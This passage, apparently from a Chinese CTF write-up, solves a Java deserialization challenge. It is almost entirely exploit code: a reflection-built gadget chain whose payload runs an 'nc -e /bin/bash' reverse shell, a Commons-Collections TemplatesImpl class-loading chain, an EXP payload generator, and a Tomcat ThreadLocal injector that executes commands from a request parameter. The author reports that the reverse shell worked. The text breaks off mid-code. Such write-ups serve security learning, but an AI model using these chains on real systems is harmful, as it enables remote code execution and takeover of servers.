<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.demo.Dog.Dog;  </span><br><span class="line"><span class="keyword">import</span> com.example.demo.Dog.DogService;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setfiled</span><span class="params">(Object o,String name,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;  </span><br><span class="line">        Class&lt;?&gt; aClass = o.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> aClass.getDeclaredField(name);  </span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            declaredField.set(o,value);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Dog <span class="title function_">makeDog</span><span class="params">(Object object,String methodName,Class[] paramTypes,Object[] args)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;  </span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">1</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">        setfiled(dog,<span class="string">&quot;object&quot;</span>,object);  </span><br><span class="line">        setfiled(dog,<span class="string">&quot;methodName&quot;</span>,methodName);  </span><br><span class="line">        setfiled(dog,<span class="string">&quot;paramTypes&quot;</span>,paramTypes);  </span><br><span class="line">        setfiled(dog,<span class="string">&quot;args&quot;</span>,args);  </span><br><span class="line">        <span class="keyword">return</span> dog;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;  </span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;5000&quot;</span>&#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">  </span><br><span class="line">        Class&lt;Runtime&gt; runtimeClass = Runtime.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runtimeClass.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);  </span><br><span class="line"><span class="comment">//        getRuntime.setAccessible(true);  </span></span><br><span class="line"><span class="comment">//        Object invoke = getRuntime.invoke(null, null);  </span></span><br><span class="line"><span class="comment">//        Method exec = runtimeClass.getDeclaredMethod(&quot;exec&quot;);  </span></span><br><span class="line"><span class="comment">//        exec.setAccessible(true);  </span></span><br><span class="line"><span class="comment">//        exec.invoke(invoke,&quot;calc&quot;);  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog1</span> <span class="operator">=</span> makeDog(runtimeClass, <span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;);  </span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> makeDog(dog1, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);  </span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog3</span> <span class="operator">=</span> makeDog(dog2,<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;);  </span><br><span class="line">  </span><br><span class="line">        map.put(<span class="number">1</span>,dog1);  </span><br><span class="line">        map.put(<span class="number">2</span>,dog2);  </span><br><span class="line">        map.put(<span class="number">3</span>,dog3);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">DogService</span> <span class="variable">dogService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DogService</span>();  </span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">DogService</span>&gt; aClass = dogService.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;dogs&quot;</span>);  </span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField.set(dogService,map);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> makeDog(dogService, <span class="string">&quot;chainWagTail&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        map1.put(dog,<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">serilize</span> <span class="operator">=</span> serilize(map1);  </span><br><span class="line">        System.out.println(serilize);  </span><br><span class="line"><span class="comment">//        try &#123;  </span></span><br><span class="line"><span class="comment">//            deserilize(serilize);  </span></span><br><span class="line"><span class="comment">//        &#125; catch (ClassNotFoundException e) &#123;  </span></span><br><span class="line"><span class="comment">//            throw new RuntimeException(e);  </span></span><br><span class="line"><span class="comment">//        &#125;  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serilize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);  </span><br><span class="line">        objectOutputStream.writeObject(object);  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserilize</span><span class="params">(String s)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(s));  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);  </span><br><span class="line">        objectInputStream.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="使用类加载"><a href="#使用类加载" class="headerlink" title="使用类加载"></a>使用类加载</h2><p>接着看了一下wp，这题也可以进行类加载，其实在cc链中，我们使用的类加载一般都是TemplatesImpl，需要调用newTransformer方法，然后一路触发调用到definclass。但是我们一般会卡到对TemplatesImpl的调用，在cc链中可以使用以下方法调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3_2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        _name.set(templates, <span class="string">&quot;cc3&quot;</span>);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">byte</span>[] b = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] _b = &#123;b&#125;;  </span><br><span class="line">        _bytecodes.set(templates, _b);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        Transformer[] T = &#123;  </span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(TrAXFilter.class),  </span></span><br><span class="line"><span class="comment">//                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)  </span></span><br><span class="line"><span class="comment">//        &#125;;  </span></span><br><span class="line"><span class="comment">//        ChainedTransformer transform = new ChainedTransformer(T);  </span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object,Object&gt; m = new HashMap();  </span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; m2 = LazyMap.decorate(m,transform);  </span></span><br><span class="line"><span class="comment">//        Class r = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span></span><br><span class="line"><span class="comment">//        Constructor constructor = r.getDeclaredConstructor(Class.class, Map.class);  </span></span><br><span class="line"><span class="comment">//        constructor.setAccessible(true);  </span></span><br><span class="line"><span class="comment">//        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class,m2);  </span></span><br><span class="line"><span class="comment">//        Map o1 = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h);  </span></span><br><span class="line"><span class="comment">//        Object o2 = constructor.newInstance(Override.class, o1);  </span></span><br><span class="line">  </span><br><span class="line">        Transformer[] T = &#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transform</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(T);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object,Object&gt; m = <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        Map&lt;Object,Object&gt; m2 = LazyMap.decorate(m,transform);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> r.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,m2);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">o1</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o2</span> <span class="operator">=</span> constructor.newInstance(Override.class, o1);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        serialize(o2);  </span><br><span class="line">        deserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        objectOutputStream.writeObject(object);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));  </span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个题目中就可以使用dog的wagTail进行调用newTransformer方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.example.demo.Dog.Dog;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField.set(templates,<span class="string">&quot;1111&quot;</span>);  </span><br><span class="line">        <span class="type">byte</span>[] b = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] b2 = &#123;b&#125;;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField2</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        declaredField2.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField2.set(templates,b2);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField3</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        declaredField3.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField3.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">2</span>,<span class="string">&quot;sss,&quot;</span>,<span class="string">&quot;sss&quot;</span>,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        map.put(dog,<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> dog.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField4</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;object&quot;</span>);  </span><br><span class="line">        declaredField4.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField4.set(dog,templates);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField5</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);  </span><br><span class="line">        declaredField5.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField5.set(dog,<span class="string">&quot;newTransformer&quot;</span>);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField6</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;paramTypes&quot;</span>);  </span><br><span class="line">        declaredField6.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField6.set(dog,<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField7</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;args&quot;</span>);  </span><br><span class="line">        declaredField7.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField7.set(dog,<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">serialize</span> <span class="operator">=</span> serialize(map);  </span><br><span class="line">        System.out.println(serialize);  </span><br><span class="line">        deserialize(serialize);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);  </span><br><span class="line">        objectOutputStream.writeObject(object);  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());  </span><br><span class="line">    &#125;;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(s);  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));  </span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/3dd769b8/20260107165950394.png" alt="image.png"><br>先试了反弹shell，成功了。</p>
<p>在试一下官方wp里给的回显方法</p>
<ol>
<li>ThreadLocal回显<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Inject_ThreadLocal.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_ThreadLocal</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射获取所需属性</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//使用modifiersField反射修改final型变量</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>)) &#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lastServicedRequestField.get(<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (lastServicedResponseField.get(<span class="literal">null</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            ServletRequest servletRequest=<span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequestField.get(<span class="literal">null</span>)!=<span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">               servletRequest = (ServletRequest) threadLocal.get();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取response变量</span></span><br><span class="line">            <span class="keyword">if</span> (lastServicedResponseField.get(<span class="literal">null</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line">                <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> (ServletResponse) threadLocal.get();</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                scanner.close();</span><br><span class="line">                writer.write(result);</span><br><span class="line">                writer.flush();</span><br><span class="line">                